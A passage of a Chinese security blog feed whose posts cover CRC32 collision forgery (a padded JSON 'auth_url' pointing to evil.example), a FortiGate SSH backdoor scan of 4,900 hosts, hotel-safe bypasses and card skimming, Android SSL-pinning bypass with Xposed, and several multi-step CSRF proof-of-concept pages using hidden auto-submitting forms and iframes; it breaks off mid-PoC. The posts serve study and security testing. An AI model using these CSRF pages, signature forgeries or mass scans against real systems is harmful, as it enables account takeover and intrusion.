  </entry>
  
  <entry>
    <title><![CDATA[CRC32算法碰撞测试]]></title>
    <link href="http://xdxd.love/2016/01/14/CRC32%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3%E5%92%8C%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF/"/>
    <id>http://xdxd.love/2016/01/14/CRC32算法详解和使用场景/</id>
    <published>2016-01-14T06:52:35.000Z</published>
    <updated>2016-01-15T02:21:58.000Z</updated>
    <content type="html"><![CDATA[<h1 id="CRC32算法概述">CRC32算法概述</h1><p>CRC全称Cyclic Redundancy Check，又叫循环冗余校验。CRC32跟md5，sha1一样都是哈希算法的一种。crc32的优势是速度快，它被设计的目的是用来检测数据在网络传输过程中可能出现的随机错误。它跟md5和sha1有本质的区别就是它不是一种加密hash算法或者叫not cryptographically secure或者not cryptographic hashing。加密哈希算法的特征比如空间极大，碰撞概率极低，对于给定的哈希值难以找到另一个哈希值相同的字符串等crc32都不具备。</p>
<h1 id="CRC32算法原理">CRC32算法原理</h1><p>前面说到crc32的一些特性，这个要从crc32的原理开始分析。crc32的数学原理看起来还是有点复杂的,我也理解不透彻。简单一点理解就是把需要进行校验的数据选定一个除数进行一次除法运算，称为模2除法，跟通常二进制除法规则不同，得到的余数作为循环冗余码。数据接收端接收到数据之后进行同样的运算，即可判断数据在传输过程中是否出现了变化。当然具体的计算方式会复杂的多。这里说的不当的地方或者有更好的表达方式欢迎讨论。</p>
<h1 id="CRC32算法碰撞和破解">CRC32算法碰撞和破解</h1><p>crc32碰撞的概率非常高，根据一些测试结果<a href="http://blog.csdn.net/yunhua_lee/article/details/42775039" target="_blank" rel="external">CRC32算法冲突概率测试和分析</a>,对于随机数据的碰撞概率测试1820W数据，冲突数量是38638个。根据crc32的算法可以直接逆向找到相同crc32的字符串。<a href="https://github.com/theonlypwner/crc32" target="_blank" rel="external">脚本地址</a></p>
<p><img src="/images/crc321.png" alt=""></p>
<p>对于给定的字符串进行padding暴力破解在短时间内是一定可以获得相同crc32结果的。测试脚本：<a href="https://github.com/stayliv3/blog_material/blob/master/crc-collision/crc-collision.py" target="_blank" rel="external">crc-collision</a><br>下面两个字符串是有相同的CRC32值。</p>
<pre><code>import binascii
print binascii.<span class="function"><span class="title">crc32</span><span class="params">(<span class="string">'{"auth_url": "https://www.evil.example"}'</span> + <span class="string">' '</span>*<span class="number">2303357834</span>)</span></span>
print binascii.<span class="function"><span class="title">crc32</span><span class="params">(<span class="string">'{"auth_url": "https://www.google.com"}'</span>)</span></span>
</code></pre><p><img src="/images/crc322.png" alt=""></p>
<h1 id="CRC32算法的使用场景">CRC32算法的使用场景</h1><p>CRC32的设计初衷是用来检测底层网络传输数据时由于网络问题导致的数据出错。所以多用在底层网络设备中。应用层也有一些使用场景。但是不能用来做加密hash即sha256函数做的事情，比如用来做签名。crc32是无法保证数据完整性的。它只能用来检测异常不能用来对抗恶意的行为。最近在对一个认证系统做审计的时候发现使用了crc32做数据签名。所以有了对crc32碰撞的测试。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="CRC32算法概述">CRC32算法概述</h1><p>CRC全称Cyclic Redundancy Check，又叫循环冗余校验。CRC32跟md5，sha1一样都是哈希算法的一种。crc32的优势是速度快，它被设计的目的是用来检测数据在网络传输过程中可能出现的]]>
    </summary>
    
      <category term="CRC" scheme="http://xdxd.love/tags/CRC/"/>
    
      <category term="加密解密" scheme="http://xdxd.love/categories/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[飞塔FortiGate SSH后门事件]]></title>
    <link href="http://xdxd.love/2016/01/13/%E9%A3%9E%E5%A1%94FortiGate-SSH%E5%90%8E%E9%97%A8%E4%BA%8B%E4%BB%B6/"/>
    <id>http://xdxd.love/2016/01/13/飞塔FortiGate-SSH后门事件/</id>
    <published>2016-01-13T02:35:51.000Z</published>
    <updated>2016-01-13T09:21:13.000Z</updated>
    <content type="html"><![CDATA[<h1 id="参考资料">参考资料</h1><p><a href="http://tools.pwn.ren/2016/01/12/ssh-backdoor-for-fortigate-os-version-4-up-to-5-0-7.html" target="_blank" rel="external">飞塔系统存在SSH后门 影响版本 4.0 – 5.0.7！！</a></p>
<p><a href="http://tools.pwn.ren/2016/01/12/ssh-backdoor-for-fortigate-os-version-4-x-up-to-5-0-7%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%88%A9%E7%94%A8-html.html" target="_blank" rel="external">飞塔SSH后门 进一步利用方法</a></p>
<p><a href="http://tools.pwn.ren/2016/01/12/%E9%9A%8F%E6%9C%BA4900%E5%8F%B0%E6%9C%BA%E5%99%A8%E6%A0%B7%E6%9C%AC%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A.html" target="_blank" rel="external">飞塔SSH后门 4900台机器样本测试报告</a></p>
<p><a href="http://seclists.org/fulldisclosure/2016/Jan/26" target="_blank" rel="external">SSH Backdoor for FortiGate OS Version 4.x up to 5.0.7</a></p>
<p><a href="https://www.zoomeye.org/search?q=FortiSSH%20country:Thailand&amp;t=host" target="_blank" rel="external">zoomeye.org</a></p>
<h1 id="思考">思考</h1><p>随着全网数据的平台越来越多，shodan，zoomeye，censys等。一旦有通用性的漏洞爆出来，很快就会对漏洞对全球的影响有了一个评估。如果平时对数据分析全面，可以迅速利用这种漏洞渗透目标。过两天应该会有对该漏洞详细的技术分析出现。</p>
<p>对于这种事总是细思极恐的感觉。比较有意思的是从安全事件中对安全防御的思考。余弦的微博：</p>
<p><img src="/images/fortygate1.png" alt=""></p>
<p>网路游侠微博：<br><img src="/images/fortygate2.png" alt=""></p>
<p>从技术角度来说，一个漏洞就是一个漏洞，一个可能导致风险的问题。可是像防火墙后门这种漏洞，可以直接渗透内网，而且存在这么多年，会不会有人利用过，回答可能是肯定的。虽然做防御的时候肯定要考虑如果别人进来了怎么办，可是有时候进来可能很简单，人家是有核武器的。</p>
<h1 id="测试">测试</h1><p><a href="http://tools.pwn.ren/2016/01/12/%E9%9A%8F%E6%9C%BA4900%E5%8F%B0%E6%9C%BA%E5%99%A8%E6%A0%B7%E6%9C%AC%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A.html" target="_blank" rel="external">飞塔SSH后门 4900台机器样本测试报告</a></p>
<p>这里使用的脚本需要稍微修改一下，</p>
<pre><code><span class="keyword">for</span> <span class="tag">i</span> <span class="keyword">in</span> ips:
    <span class="tag">q</span>.<span class="function"><span class="title">put</span><span class="params">(ips)</span></span>
</code></pre><p>改成：</p>
<pre><code><span class="keyword">for</span> <span class="tag">i</span> <span class="keyword">in</span> ips:
    <span class="tag">q</span>.<span class="function"><span class="title">put</span><span class="params">(i)</span></span>
</code></pre><p>不知道是不是故意的。。。</p>
<p>这里测试的时候没有筛选开放22端口的主机，直接对4900机器进行测试，最后存在漏洞的机器为858台。相关的脚本和数据地址。<a href="https://github.com/stayliv3/blog_material/tree/master/fortigate" target="_blank" rel="external">https://github.com/stayliv3/blog_material/tree/master/fortigate</a></p>
<p><img src="/images/fortygate3.png" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="参考资料">参考资料</h1><p><a href="http://tools.pwn.ren/2016/01/12/ssh-backdoor-for-fortigate-os-version-4-up-to-5-0-7.html" target="_blank"]]>
    </summary>
    
      <category term="黑盒测试" scheme="http://xdxd.love/categories/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[保险箱安全分析]]></title>
    <link href="http://xdxd.love/2016/01/13/%E4%BF%9D%E9%99%A9%E7%AE%B1%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2016/01/13/保险箱安全分析/</id>
    <published>2016-01-13T01:50:05.000Z</published>
    <updated>2016-01-13T01:59:05.000Z</updated>
    <content type="html"><![CDATA[<p>参加freebuf的FIT大会，黑客叔叔演示了现场破解保险箱。他说道了有比较多的方法可以破解保险箱，比如可以设置多组密码，如果只设置了一组的话，其他组的默认密码还是123456.可以使用树莓派模拟信号秒开保险箱，备用钥匙安全性很低等。</p>
<p>想起之前翻译的一篇国外的博客。Freebuf地址<a href="http://www.freebuf.com/news/special/38727.html" target="_blank" rel="external">走进科学：酒店保险箱真的保险么？</a></p>
<p>本文是FreeBuf《走进科学》系列最新力作，翻译自国外安全组织G DATA SecurityLabs一篇针对酒店保险箱的分析报告。他们的研究对象是一款产自中国并且以很多不同的品牌出售的保险柜（made in China and is sold under many different brands）。相信读完本文之后大家会对酒店保险箱的安全性有一些新的认识。</p>
<p>保险箱介绍</p>
<p>下图中是一个标准的酒店保险箱。外壳是钢制的，自带电池，即使断电依然可以工作。通常打开保险箱的方式有两种，使用PIN码(4到10位的数字)或者刷信用卡。此外使用应急钥匙也可以打开保险箱。只是顾客是拿不到的，只有酒店的管理者才有这把钥匙。主要是当顾客忘记PIN码，电池没电又停电或者顾客离开酒店但是没有打开保险箱的情况下使用。</p>
<p><img src="http://image.3001.net/images/20140721/1405934456300.png!small" alt=""><br>图中金色的铁片遮盖了钥匙孔。解开这两个螺丝，就可以看到插应急钥匙的地方。视频演示1（Youtube)：正常情况下打开和锁定保险柜。<br>保险箱工作原理</p>
<p>保险箱由3个部分组成。钢制的箱体本身，前输入面板–包括PIN码输入和信用卡读卡器，位于门后的控制系统。<br><img src="http://image.3001.net/images/20140721/14059344754543.png!small" alt=""><br>为了更好的理解内部结构，我们把门拆开看一下。</p>
<p><img src="http://image.3001.net/images/20140721/14059345065928.png!small" alt=""></p>
<p><img src="http://image.3001.net/images/20140721/1405934503295.png!small" alt=""></p>
<p>仔细看一下控制系统就会发现插应急钥匙的钥匙孔。还有用于开门的小马达和一块电路板。当用户输入PIN码的时候，电路板会检查PIN码是否正确。如果正确，则会启动马达。演示视频2（Youtube）。</p>
<p>Hacking 1:打开保险箱</p>
<p>超级管理密码：</p>
<p>最简单的方法是使用超级管理密码。使用超级管理密码可以配置保险箱，查看保险箱使用记录，当然也能打开保险箱。默认的超级密码是一串简单的数字序列。启动超级密码输入的方式是快速按两次#号键。当然，超级密码是可以被修改的。但是在我们的测试过程中发现大量的保险箱都是默认的超级密码。</p>
<p>开锁器</p>
<p>应急钥匙是一种机械的开门方式。开起来钥匙还是挺复杂的。</p>
<p><img src="http://image.3001.net/images/20140721/14059345965151.png!small" alt=""></p>
<p><img src="http://image.3001.net/images/20140721/14059345972381.png!small" alt=""></p>
<p>图中可以看到钥匙有4个部分。对于我们这种初学者，这种程度的钥匙还是挺复杂的。不过幸运的是制造商帮了我们一个忙。钥匙的四个面中，真正起作用的只有一个面。(这是吐槽中国特色的节奏么。。）</p>
<p>演示视频3：不用钥匙，手动开锁。<br>人工短路，破坏保险箱逻辑</p>
<p>第三种hack的方式是通过人工短路来模拟保险箱打开的信号。为了理解这种技术的原理，我们先看一下保险箱如何检测门是否打开的。</p>
<p><img src="http://image.3001.net/images/20140721/1405934653165.png!small" alt=""></p>
<p><img src="http://image.3001.net/images/20140721/14059346582376.png!small" alt=""></p>
<p>通过上图可以看到，门开的时候会按压一个绿色的连接器，在电路板上形成一个短路信号。我们测试的攻击场景是这样的：</p>
<p>1.关闭保险箱。<br>2.在保险箱的控制系统上引起一个短路，让保险箱认为自己的门打开了。(事实上门依然关闭的）<br>3.这时候，保险箱显示的不是等待打开保险箱的PIN码，而是变成等待输入一个新的PIN码用来关闭保险箱。<br>4.我们输入一个新的PIN码。<br>5.然后保险箱会尝试关闭门。(事实上门已经是关闭的了）<br>6.新输入的PIN码可以用来打开保险箱。<br>这种方式的难点在于如何从外部引起保险箱的短路。我们从固定保险箱logo的螺丝孔插入了一根铁丝。在我们的测试中，使用如此简单的工具，大概30分钟左右，可以成功引起保险箱短路。专业的窃贼的话，可以利用更加合适的工具，应该缩短这个时间。<br>Hacking 2:使用信用卡的风险<br>前面介绍过，保险箱也可以使用信用卡来锁定和打开。经过我们测试发现，这个场景中只能使用信用卡，其他的磁卡是不行的。系统会检查所用的磁卡是否是信用卡。<br><img src="http://image.3001.net/images/20140721/14059346854833.png!small" alt=""></p>
<p>信用卡信息可以被窃取么</p>
<p>我们经常看到有犯罪分子在ATM机上加装设备，获取银行卡信息。如下图所示就是常用来窃取银行卡信息的设备。</p>
<p><img src="http://image.3001.net/images/20140721/14059347247265.jpg!small" alt=""></p>
<p><img src="http://image.3001.net/images/20140721/14059347426365.jpg!small" alt=""></p>
<p>在我们的例子中，实现窃取信用卡信息也不困难。我们使用Arduino Uno board来完成了这个任务。</p>
<p><img src="http://image.3001.net/images/20140721/14059347629772.png!small" alt=""></p>
<p>如图所示，并不需要多少空间就可以装下这个自制的设备。通过这个装置，可以读取到信用卡的号码，所有人的名字以及卡片的过期时间。下面是读取到的一张信用卡的截图。</p>
<p><img src="http://image.3001.net/images/20140721/14059347747487.png!small" alt=""></p>
<p>结论：</p>
<p>经过以上的分析可以看出，我们分析的这一款保险箱安全级别并不是特别高。我们可以轻易的使用几种不同的方式来打开它。对于酒店的管理者，建议修改保险柜的默认超级密码。对于用户，我们建议不要过分依赖酒店的保险箱。而且尽量不要使用信用卡来开关保险箱，这样存在信用卡信息别盗的风险。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>参加freebuf的FIT大会，黑客叔叔演示了现场破解保险箱。他说道了有比较多的方法可以破解保险箱，比如可以设置多组密码，如果只设置了一组的话，其他组的默认密码还是123456.可以使用树莓派模拟信号秒开保险箱，备用钥匙安全性很低等。</p>
<p>想起之前翻译的一篇国外的]]>
    </summary>
    
      <category term="保险箱" scheme="http://xdxd.love/tags/%E4%BF%9D%E9%99%A9%E7%AE%B1/"/>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[无状态协议中认证状态保持方案的一些思考]]></title>
    <link href="http://xdxd.love/2016/01/07/%E6%97%A0%E7%8A%B6%E6%80%81%E5%8D%8F%E8%AE%AE%E4%B8%AD%E8%AE%A4%E8%AF%81%E7%8A%B6%E6%80%81%E4%BF%9D%E6%8C%81%E6%96%B9%E6%A1%88%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"/>
    <id>http://xdxd.love/2016/01/07/无状态协议中认证状态保持方案的一些思考/</id>
    <published>2016-01-07T03:12:42.000Z</published>
    <updated>2016-01-11T09:03:14.000Z</updated>
    <content type="html"><![CDATA[<p>给文章起了一个高大上的名字，主要是想写一下对于http协议中用户登陆之后，如何进行用户身份跟踪，以及不同的实现方案可能存在的安全问题。</p>
<h1 id="何为登陆">何为登陆</h1><p><a href="https://en.wikipedia.org/wiki/Login" target="_blank" rel="external">login维基百科</a>上解释是一个用户通过认证获得一个系统的访问权限的过程。感觉更多的是一种业务上的描述，在讨论安全架构设计的时候都是使用identity,authentication等词语描述。</p>
<h1 id="何为认证_authentication">何为认证 authentication</h1><h1 id="不同的认证方式">不同的认证方式</h1><p>认证有不少协议，参考<a href="https://en.wikipedia.org/wiki/Basic_access_authentication" target="_blank" rel="external">Basic access authentication</a></p>
<h1 id="最常见的情形">最常见的情形</h1><p>在web应用中，通常都是web表单提交用户名密码的方式实现登陆。登陆之后，服务端会写一些信息到cookie中，以后的访问通过cookie中的信息来识别该请求的来源用户身份。</p>
<p>在比较早的应用中还可以看到服务端将用户名和密码保存在cookie中，服务端对每个请求，都会验证验证cookie中的用户名和密码是否正确。这种实现方案虽然在功能上实现了保持用户的身份状态。但是有比较高的安全风险。现在基本上很少见这种实现了。</p>
<p>目前最常见的两种方式，一种是使用sessionID的方式来跟踪用户，一种是将加密后的用户id或者用户id和密码保存在cookie中。以前我一直以为使用sessionID的方式才是最佳实践，把用户信息加密之后放在客户端是一种违背了安全设计思路的事情。但是看到<a href="http://drops.wooyun.org/papers/1449" target="_blank" rel="external">Codeigniter</a>作为流行的框架，也是采用了这种设计。</p>
<p>其实仔细思考一下，可以认为这是两种不同的设计方式，各有优劣，只要设计得当，都可以做到安全。采用sessionid的方式一定要有一个集中的管理session数据的中心，而采用加密算法的方式可以认为是将数据查询的过程转化成了cpu操作的加解密。这样子就不需要依赖集中的数据中心可以方便的实现分布式。</p>
<p>使用sessionid的方式，需要一个中心管理session数据<br><img src="/images/denglu1.png" alt=""></p>
<p>使用加解密用户数据的方式维持登录状态不需要数据查询，只需要cpu加解密操作就可以。</p>
<p><img src="/images/denglu2.png" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>给文章起了一个高大上的名字，主要是想写一下对于http协议中用户登陆之后，如何进行用户身份跟踪，以及不同的实现方案可能存在的安全问题。</p>
<h1 id="何为登陆">何为登陆</h1><p><a href="https://en.wikipedia.org/wiki/]]>
    </summary>
    
      <category term="sso" scheme="http://xdxd.love/tags/sso/"/>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[利用xposed绕过安卓SSL证书的强校验]]></title>
    <link href="http://xdxd.love/2015/12/30/%E5%88%A9%E7%94%A8xposed%E7%BB%95%E8%BF%87%E5%AE%89%E5%8D%93SSL%E8%AF%81%E4%B9%A6%E7%9A%84%E5%BC%BA%E6%A0%A1%E9%AA%8C/"/>
    <id>http://xdxd.love/2015/12/30/利用xposed绕过安卓SSL证书的强校验/</id>
    <published>2015-12-30T02:51:31.000Z</published>
    <updated>2015-12-30T03:03:50.000Z</updated>
    <content type="html"><![CDATA[<h1 id="什么是SSL_pinning">什么是SSL pinning</h1><p>https协议验证服务器身份的方式通常有三种，一是根据浏览器或者说操作系统（Android）自带的证书链；二是使用自签名证书；三是自签名证书加上SSL Pinning特性。第一种需要到知名证书机构购买证书，需要一定预算。第二种多见于内网使用。第三种在是安全性最高的，但是需要浏览器插件或客户端使用了SSL Pinning特性。<br>Android应用程序在使用https协议时也使用类似的3种方式验证服务器身份，分别是系统证书库、自带证书库、自带证书库 + SSL Pinning特性。<br>所以SSL Pinning，即SSL证书绑定，是验证服务器身份的一种方式，是在https协议建立通信时增加的代码逻辑，它通过自己的方式验证服务器身份，然后决定通信是否继续下去。它唯一指定了服务器的身份，所以安全性较高。</p>
<p><img src="/images/xposed1.png" alt=""></p>
<h1 id="JustTrustMe">JustTrustMe</h1><p>当客户端使用了SSL pinning的时候，手机导入burpsuite证书的方式也无法抓到通信包。除了修改apk验证证书逻辑重新打包的方式外，最简单的方法是使用xposed相关模块。</p>
<p>xposed安装方法：</p>
<p><a href="http://repo.xposed.info/module/de.robv.android.xposed.installer" target="_blank" rel="external">下载xposed安装包</a></p>
<p>安装xposed框架到手机：</p>
<pre><code>adb install <span class="tag">&lt;<span class="title">xposed-installer-you-just-downloaded</span>&gt;</span>.apk
</code></pre><p>安装并启用<a href="https://github.com/Fuzion24/JustTrustMe" target="_blank" rel="external">justtrustme模块</a></p>
<p>重启手机就可以抓到之前抓不到的https通信了。</p>
<h1 id="参考资料">参考资料</h1><p><a href="http://www.nsfocus.com.cn/upload/contents/2015/07/2015_07241353337959.pdf" target="_blank" rel="external">http://www.nsfocus.com.cn/upload/contents/2015/07/2015_07241353337959.pdf</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="什么是SSL_pinning">什么是SSL pinning</h1><p>https协议验证服务器身份的方式通常有三种，一是根据浏览器或者说操作系统（Android）自带的证书链；二是使用自签名证书；三是自签名证书加上SSL Pinning特性。第一种需要到知名]]>
    </summary>
    
      <category term="xposed" scheme="http://xdxd.love/tags/xposed/"/>
    
      <category term="移动安全" scheme="http://xdxd.love/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[多步csrf漏洞场景及其利用]]></title>
    <link href="http://xdxd.love/2015/12/24/%E5%A4%9A%E6%AD%A5csrf%E6%BC%8F%E6%B4%9E%E5%9C%BA%E6%99%AF%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/"/>
    <id>http://xdxd.love/2015/12/24/多步csrf漏洞场景及其利用/</id>
    <published>2015-12-24T09:05:22.000Z</published>
    <updated>2015-12-25T02:00:31.000Z</updated>
    <content type="html"><![CDATA[<p>发布在了<a href="http://www.freebuf.com/articles/web/58387.html" target="_blank" rel="external">Freebuf</a>上，有删改。</p>
<p>CSRF的漏洞原理和利用方式这里就不多赘述了。平时大家讨论的CSRF利用多是发送一次请求。比如CSRF刷粉丝，CSRF发微博。这里主要讨论一个稍微复杂点的利用场景。</p>
<p>最近在众测的时候遇到一个案例，用户绑定邮箱的请求没有防御CSRF。但是大家都知道绑定邮箱这个操作不是一步完成了。这次遇到的这个案例是这样的。用户发送一个申请绑定邮箱的请求，服务器给该邮箱发送一个验证码，然后用户在页面中输入验证码完成绑定。</p>
<p><img src="/images/mulcsrf1.jpg" alt=""></p>
<p>从上图的路程中可以看出。按照常见的csrf的漏洞来说，这里是没法利用的。因为即使我们伪造了请求，让用户发出了绑定申请的邮件，还需要用户把这个验证码在页面上输入才行。经过更进一步的分析发现，图中4这一步也是没有防御CSRF的。也就是说我们可以伪造两次请求来实现CSRF绑定邮箱。这样一个场景就是比较典型的多步CSRF。</p>
<p>有了思路就可以开始写demo了。最初的想法：是不是用两个表单就可以了呢。</p>
<pre><code><span class="tag">&lt;<span class="title">html</span>&gt;</span>
<span class="tag">&lt;<span class="title">body</span>&gt;</span>
<span class="tag">&lt;<span class="title">form</span> <span class="attribute">id</span>=<span class="value">"form1"</span> <span class="attribute">method</span>=<span class="value">"POST"</span>  <span class="attribute">action</span>=<span class="value">" https://www.example.com/first.aspx"</span>&gt;</span>
<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">name</span>=<span class="value">"test1"</span> <span class="attribute">value</span>=<span class="value">"1"</span>&gt;</span>
<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"submit"</span> <span class="attribute">value</span>=<span class="value">"form1"</span>&gt;</span>
<span class="tag">&lt;/<span class="title">form</span>&gt;</span>
<span class="tag">&lt;<span class="title">form</span> <span class="attribute">id</span>=<span class="value">"form2"</span> <span class="attribute">method</span>=<span class="value">"POST"</span>  <span class="attribute">action</span>=<span class="value">" https://www.example.com/second.aspx"</span>&gt;</span>
<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">name</span>=<span class="value">"test2"</span> <span class="attribute">value</span>=<span class="value">"2"</span>&gt;</span>
<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"submit"</span> <span class="attribute">value</span>=<span class="value">"form2"</span>&gt;</span>
<span class="tag">&lt;/<span class="title">form</span>&gt;</span>
<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
<span class="built_in">document</span>.getElementById(<span class="string">"form1"</span>).submit();
<span class="built_in">window</span>.setTimeout( <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>{ <span class="built_in">document</span>.forms.form2.submit()}, <span class="number">12000</span>); 
</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
<span class="tag">&lt;/<span class="title">body</span>&gt;</span>
<span class="tag">&lt;/<span class="title">html</span>&gt;</span>
</code></pre><p>测试发现这想法太天真了。第一个表单提交之后，就会跳转到返回的结果页面了。第二个表单不会提交了。而且这里遇到的这个场景比较特殊，并不是仅仅是先后提交两个表单就可以了。第二个表单里的值(验证码)是需要第一个表单提交之后，从邮箱里读出来再放到第二个表单里。<br>测试结果见下图：只会发送第一个表单的请求。</p>
<p><img src="/images/mulcsrf2.gif" alt=""></p>
<p>经过查找资料。找到几个解决方案。</p>
<p>解决方案1：<br>使用form的target属性。target 属性规定在何处打开 action URL。</p>
<p><img src="/images/mulcsrf3.jpg!small" alt=""></p>
<p>根据查到的资料。默认是_self。所以会跳到结果页。我们使用_blank试试。</p>
<pre><code><span class="tag">&lt;<span class="title">html</span>&gt;</span>
<span class="tag">&lt;<span class="title">body</span>&gt;</span>
<span class="tag">&lt;<span class="title">form</span> <span class="attribute">id</span>=<span class="value">"form1"</span> <span class="attribute">method</span>=<span class="value">"POST"</span>  <span class="attribute">target</span>=<span class="value">'_blank'</span> <span class="attribute">action</span>=<span class="value">" https://www.example.com/first.aspx"</span>&gt;</span>
<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">name</span>=<span class="value">"test1"</span> <span class="attribute">value</span>=<span class="value">"1"</span>&gt;</span>
<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"submit"</span> <span class="attribute">value</span>=<span class="value">"form1"</span>&gt;</span>
<span class="tag">&lt;/<span class="title">form</span>&gt;</span>
<span class="tag">&lt;<span class="title">form</span> <span class="attribute">id</span>=<span class="value">"form2"</span> <span class="attribute">method</span>=<span class="value">"POST"</span> <span class="attribute">target</span>=<span class="value">'_blank'</span> <span class="attribute">action</span>=<span class="value">" https://www.example.com/second.aspx"</span>&gt;</span>
<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">name</span>=<span class="value">"test2"</span> <span class="attribute">value</span>=<span class="value">"2"</span>&gt;</span>
<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"submit"</span> <span class="attribute">value</span>=<span class="value">"form2"</span>&gt;</span>
<span class="tag">&lt;/<span class="title">form</span>&gt;</span>
<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
<span class="built_in">document</span>.getElementById(<span class="string">"form1"</span>).submit();
<span class="built_in">window</span>.setTimeout( <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>{ <span class="built_in">document</span>.forms.form2.submit()}, <span class="number">12000</span>); 
</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
<span class="tag">&lt;/<span class="title">body</span>&gt;</span>
<span class="tag">&lt;/<span class="title">html</span>&gt;</span>
</code></pre><p>这种方式可以实现两次post的需求，不过太过暴力。需要新弹出窗口不说。弹出窗口也很可能被浏览器拦截掉。</p>
<p><img src="/images/mulcsrf4.gif" alt=""></p>
<p>解决方案2：</p>
<p>target可以选择一个frame。framename  在指定的框架中打开。<br>所以可以这样写。这样子可以比较优雅的发两个post请求。</p>
<pre><code>&lt;html&gt;
&lt;body&gt;
&lt;form id=<span class="string">"form1"</span> <span class="keyword">method</span>=<span class="string">"POST"</span> target='csrfIframe1' action=<span class="string">"https://www.baidu.com/first.aspx"</span>&gt;
&lt;input <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"test1"</span> value=<span class="string">"1"</span>&gt;
&lt;input <span class="keyword">type</span>=<span class="string">"submit"</span> value=<span class="string">"form1"</span>&gt;
&lt;/form&gt;
&lt;form id=<span class="string">"form2"</span> <span class="keyword">method</span>=<span class="string">"POST"</span> target='csrfIframe2' action=<span class="string">"https://www.baidu.com/second.aspx"</span>&gt;
&lt;input <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"test2"</span> value=<span class="string">"2"</span>&gt;
&lt;input <span class="keyword">type</span>=<span class="string">"submit"</span> value=<span class="string">"form2"</span>&gt;
&lt;/form&gt;
window.onload = function() {
document.getElementById(<span class="string">"form1"</span>).submit();
// to make <span class="number">2</span>nd form wait <span class="keyword">for</span> <span class="number">1</span>st, put the following <span class="keyword">in</span> a function <span class="keyword">and</span> use <span class="keyword">as</span> a callback <span class="keyword">for</span> a new timer
document.getElementById(<span class="string">"form2"</span>).submit();
}
&lt;/script&gt;
&lt;iframe style=<span class="string">"display: hidden"</span> height=<span class="string">"0"</span> width=<span class="string">"0"</span> frameborder=<span class="string">"0"</span> name=<span class="string">"csrfIframe1"</span>&gt;&lt;/iframe&gt;
&lt;iframe style=<span class="string">"display: hidden"</span> height=<span class="string">"0"</span> width=<span class="string">"0"</span> frameborder=<span class="string">"0"</span> name=<span class="string">"csrfIframe2"</span>&gt;&lt;/iframe&gt;
&lt;/body&gt; &lt;/html&gt;
</code></pre><p><img src="/images/mulcsrf5.gif" alt=""></p>
<p>解决方案3<br>使用iframe自然也是可以的。类似</p>
<pre><code>&lt;<span class="tag">iframe</span> src=<span class="string">"2post3.html"</span> <span class="attribute">width</span>=<span class="string">"0"</span> <span class="attribute">height</span>=<span class="string">"0"</span>&gt;
&lt;/iframe&gt;
&lt;<span class="tag">iframe</span> src=<span class="string">"2post4.html"</span> <span class="attribute">width</span>=<span class="string">"0"</span> <span class="attribute">height</span>=<span class="string">"0"</span>&gt;
&lt;/iframe&gt;
</code></pre><p>就不演示了。</p>
<h2 id="具体到邮箱验证这个场景我使用了如下的一个poc">具体到邮箱验证这个场景我使用了如下的一个poc</h2><p>文件1：发送申请邮箱绑定的请求：</p>
<pre><code>    <span class="tag">&lt;<span class="title">html</span>&gt;</span>
    <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>
    <span class="tag">&lt;<span class="title">body</span>&gt;</span>
    <span class="comment">&lt;!-- hidden iframes --&gt;</span>
    <span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">style</span>=<span class="value">"display: hidden"</span> <span class="attribute">height</span>=<span class="value">"100"</span> <span class="attribute">width</span>=<span class="value">"100"</span> <span class="attribute">frameborder</span>=<span class="value">"0"</span> <span class="attribute">name</span>=<span class="value">"csrfIframe1"</span>&gt;</span><span class="tag">&lt;/<span class="title">iframe</span>&gt;</span>
